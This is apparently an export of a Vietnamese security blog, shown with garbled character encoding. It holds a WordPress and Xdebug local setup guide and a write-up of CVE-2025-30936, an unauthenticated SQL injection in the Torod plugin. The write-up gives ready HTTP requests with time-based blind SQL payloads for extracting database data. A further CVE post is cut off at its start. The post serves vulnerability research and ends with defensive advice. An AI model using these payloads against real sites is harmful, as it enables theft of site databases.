s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Torod c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.9 Fixed in: \u0026lt;= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Torod: v1.9 Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nVulnerable Sink CVE n√†y kh√¥ng c√≥ b·∫£n v√° n√™n kh√¥ng th·ªÉ s·ª≠ d·ª•ng diff tool ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa code l·ªói v√† code ƒë√£ fix l·ªói.\nTrong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong th∆∞ m·ª•c c·ªßa plugin ƒë·ªÉ t√¨m sink. {: .prompt-tip }\nüëâ D·ªØ li·ªáu t·ª´ $_POST['country_id'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\nSource: $_POST['country_id'] Sink: $wpdb-\u0026gt;get_results(\u0026quot;SELECT * FROM $table_name WHERE country_id = $country_id\u0026quot;) How it work? L·ªó h·ªïng n·∫±m trong h√†m get_regions_and_cities c·ªßa class ajaxyk thu·ªôc file inc/ajaxyk.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_regions_and_cities trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_regions_and_cities ƒë∆∞·ª£c construct c·ªßa class ajaxyk g·ªçi l√†m callback c·ªßa 2 action hook th√¥ng qua h√†m add_action\nwp_ajax_get_regions_and_cities\nƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_{$action} Y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p wp_ajax_nopriv_get_regions_and_cities\nƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_nopriv_{$action} Kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p V√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated n√™n ta ch·ªâ quan t√¢m t·ªõi hook wp_ajax_nopriv_get_regions_and_cities.\nNh∆∞ v·∫≠y khi g·ª≠i POST request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi tham s·ªë\naction=wp_ajax_nopriv_get_regions_and_cities\u0026amp;country_id=payload_here: Callback get_regions_and_cities ƒë∆∞·ª£c g·ªçi. country_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi.\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026amp;country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026amp;country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ country_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-30936 trong plugin WordPress Torod t·ª´ phi√™n b·∫£n 1.9 tr·ªü l·∫°i, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nCh∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Torod Plugin \u0026lt;= 1.9 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-10-cve-2025-30936/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTorod\u003c/strong\u003e c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-30936\"\u003eCVE-2025-30936\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/torod/\"\u003eWordPress Torod Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.9\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFixed in\u003c/strong\u003e: \u0026lt;= N/A\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTorod\u003c/strong\u003e: v1.9\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003ePOST\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-30936"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin MyStyle Custom Product Designer c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.21.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48281 Product: WordPress MyStyle Custom Product Designer Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.21.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging MyStyle Custom Product Designer: v3.21.1(vul) v√† v3.21.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i MyStyle Custom Product Designer Plugin, m·ªôt s·ªë h√†m trong WooCommerce 